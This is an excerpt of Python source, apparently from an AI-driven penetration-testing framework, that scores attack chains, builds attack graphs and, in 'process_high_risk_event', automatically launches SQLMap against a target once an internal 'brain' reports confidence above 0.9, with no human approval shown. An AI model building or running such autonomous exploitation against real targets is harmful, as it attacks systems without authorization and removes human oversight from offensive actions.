    def _score_attack_chains(self, phases: List[Dict], features: Dict) -> Dict:
        """Score attack chains by likelihood and impact"""
        if not phases:
            return {'score': 0, 'likelihood': 0, 'impact': 0, 'steps': []}
        
        scored_steps = []
        total_likelihood = 0
        
        for i, phase in enumerate(phases):
            likelihood = 0.7 if i == 0 else 0.5  # First phase more likely
            impact = 0.8 if 'exploit' in phase.get('name', '').lower() else 0.5
            
            scored_steps.append({
                'step': phase.get('name', f'Phase {i+1}'),
                'likelihood': likelihood,
                'impact': impact,
                'tools': phase.get('tools', [])
            })
            
            total_likelihood += likelihood
        
        avg_likelihood = total_likelihood / len(phases) if phases else 0
        max_impact = max([s['impact'] for s in scored_steps], default=0)
        
        return {
            'score': avg_likelihood * max_impact,
            'likelihood': avg_likelihood,
            'impact': max_impact,
            'steps': scored_steps,
            'risk_level': 'HIGH' if avg_likelihood * max_impact > 0.5 else 'MEDIUM'
        }
    
    def _calculate_confidence(self, chain_score: Dict, historical: List[Dict], features: Dict) -> Dict:
        """Calculate confidence with uncertainty"""
        base_confidence = chain_score.get('score', 0.5)
        
        # Adjust based on historical data
        if historical:
            successes = sum(1 for h in historical if h.get('success', False))
            historical_factor = successes / len(historical) if historical else 0
            base_confidence = base_confidence * 0.7 + historical_factor * 0.3
        
        # Calculate uncertainty (lack of information)
        uncertainty = 0.5
        if features.get('vuln_count', 0) > 0:
            uncertainty -= 0.1
        if features.get('port_count', 0) > 0:
            uncertainty -= 0.1
        if len(historical) > 5:
            uncertainty -= 0.2
        
        uncertainty = max(0.1, min(0.9, uncertainty))
        
        return {
            'confidence': round(base_confidence, 2),
            'uncertainty': round(uncertainty, 2),
            'credible_interval': [round(max(0, base_confidence - uncertainty), 2),
                                  round(min(1, base_confidence + uncertainty), 2)],
            'needs_more_data': uncertainty > 0.3
        }
    
    def _generate_attack_graph(self, features: Dict, chain_score: Dict, confidence: Dict, strategy: Dict) -> Dict:
        """Generate attack graph for visualization"""
        graph = {
            'nodes': [],
            'edges': [],
            'paths': []
        }
        
        # Initial node
        graph['nodes'].append({
            'id': 'initial',
            'label': 'Initial Access',
            'type': 'state',
            'score': 0.5
        })
        
        # Service nodes
        for i, service in enumerate(features.get('services', [])[:3]):
            node_id = f"service_{i}"
            graph['nodes'].append({
                'id': node_id,
                'label': f"{service.get('name', 'unknown')}:{service.get('port', '?')}",
                'type': 'service',
                'score': 0.6
            })
            graph['edges'].append({
                'from': 'initial',
                'to': node_id,
                'label': 'scans'
            })
        
        # Vulnerability nodes
        for i, vuln in enumerate(features.get('vulnerabilities', [])[:3]):
            node_id = f"vuln_{i}"
            severity = vuln.get('severity', 'MEDIUM')
            graph['nodes'].append({
                'id': node_id,
                'label': vuln.get('name', 'Unknown')[:30],
                'type': 'vulnerability',
                'severity': severity,
                'score': 0.9 if severity == 'CRITICAL' else 0.7
            })
            
            # Connect to relevant service
            for j, service in enumerate(features.get('services', [])[:3]):
                if service.get('name', '').lower() in str(vuln).lower():
                    graph['edges'].append({
                        'from': f"service_{j}",
                        'to': node_id,
                        'label': 'has_vuln'
                    })
        
        # Action nodes from strategy
        strategy_phases = strategy.get('phases', []) if isinstance(strategy, dict) else []
        for i, phase in enumerate(strategy_phases[:2]):
            node_id = f"action_{i}"
            graph['nodes'].append({
                'id': node_id,
                'label': phase.get('name', f'Phase {i+1}'),
                'type': 'action',
                'score': 0.8
            })
            
            if i == 0:
                # Connect first action to vulnerabilities
                for j in range(min(2, len(features.get('vulnerabilities', [])))):
                    graph['edges'].append({
                        'from': f"vuln_{j}",
                        'to': node_id,
                        'label': 'exploit'
                    })
            else:
                # Connect actions sequentially
                graph['edges'].append({
                    'from': f"action_{i-1}",
                    'to': node_id,
                    'label': 'next'
                })
        
        # Success node
        graph['nodes'].append({
            'id': 'success',
            'label': 'Exploitation Success',
            'type': 'success',
            'score': confidence.get('confidence', 0.5)
        })
        
        # Connect last action to success
        if strategy_phases:
            graph['edges'].append({
                'from': f"action_{len(strategy_phases)-1}",
                'to': 'success',
                'label': 'achieves'
            })
        
        # Generate paths
        graph['paths'] = self._extract_paths(graph)
        
        # Visualization data for D3.js
        graph['visualization'] = {
            'nodes': [
                {'id': n['id'], 'label': n['label'], 'group': n['type']}
                for n in graph['nodes']
            ],
            'links': [
                {'source': e['from'], 'target': e['to'], 'value': 1}
                for e in graph['edges']
            ]
        }
        
        return graph
    
    def _extract_paths(self, graph: Dict) -> List[Dict]:
        """Extract attack paths from graph"""
        paths = []
        
        # Simple path extraction (initial -> ... -> success)
        success_nodes = [n for n in graph['nodes'] if n.get('type') == 'success']
        if not success_nodes:
            return paths
        
        success_id = success_nodes[0]['id']
        
        # Find all paths to success
        for node in graph['nodes']:
            if node.get('type') == 'vulnerability':
                # Build path: initial -> service -> vuln -> action -> success
                path_nodes = ['initial']
                
                # Find service connected to this vuln
                for edge in graph['edges']:
                    if edge.get('to') == node['id']:
                        path_nodes.append(edge.get('from'))
                
                path_nodes.append(node['id'])
                
                # Find action connected to this vuln
                for edge in graph['edges']:
                    if edge.get('from') == node['id']:
                        path_nodes.append(edge.get('to'))
                
                path_nodes.append(success_id)
                
                paths.append({
                    'nodes': path_nodes,
                    'score': node.get('score', 0.5),
                    'length': len(path_nodes)
                })
        
        return sorted(paths, key=lambda x: x['score'], reverse=True)[:3]
    
    async def process_high_risk_event(self, event):
        """
        Decision Matrix: AI evaluates the event and chooses whether to 
        launch an automated exploit via SQLMap or Metasploit.
        """
        if not self.sentinel_brain or not self.exploit_engine:
            logger.warning("Brain or Exploit Engine not ready.")
            return

        # Check for SQL Injection Potential
        if event.get('type') == "SQL_INJECTION_POTENTIAL":
            # AI Decision: Run the event through the 7-layer brain
            if hasattr(self.sentinel_brain, 'think'):
                analysis = self.sentinel_brain.think(event)
                confidence = analysis.get('layer4_bnn', {}).get('confidence', 0)
                
                logger.info(f"🧠 AI Analysis Confidence: {confidence:.2f}")

                if confidence > 0.9:
                    target = event.get('target')
                    logger.info(f"🚀 High confidence detected! Triggering SQLMap on {target}")
                    
                    # Trigger the tool
                    task_result = self.exploit_engine.trigger_sqlmap(target)
                    
                    # Update the UI via WebSockets
                    await self.broadcast_to_ui("EXPLOIT_STATUS", {
                        "tool": "SQLMap", 
                        "status": "In Progress" if task_result.get('status') == 'initiated' else "Failed",
                        "target": target,
                        "task_id": task_result.get('pid'),
                        "ai_reasoning": analysis.get('layer4_bnn', {}).get('reasoning', 'No reasoning provided')
                    })

    async def broadcast_to_ui(self, event_type, data):
        """Helper to push data to the results.html dashboard"""
        if self.sio:
            try:
                await self.sio.emit('exploit_update', {'type': event_type, 'data': data})
            except Exception as e:
                logger.error(f"Failed to broadcast to UI: {e}")
        else:
            logger.debug("Socket.IO not configured, skipping broadcast")
    
    def get_pipeline_stats(self) -> Dict:
        """Get pipeline statistics"""
        return {
            **self.pipeline_stats,
            'components': {
                'correlation': bool(self.correlation_system),
                'intelligence': bool(self.intelligence_engine),
                'sentinel': bool(self.sentinel_brain),
                'emily': bool(self.emily_ai),
                'rag': bool(self.rag_system),
                'exploit_engine': bool(self.exploit_engine),
                'neural_pipeline': bool(self.neural_pipeline)
            }
        }


# orchestrator.py - Attack Lifecycle
async def run_tool(self, tool, target):
    # Validate via Layer 8: Safety Cage
    if not self.safety_cage.validate(f"{tool} {target}"):
        return {"status": "blocked", "reason": "Safety Violation"}
    
    # Execute and Broadcast
    result = await self.exploit_engine.execute(tool, target)
    await self.broadcast_to_ui("EXPLOIT_UPDATE", result)
    return result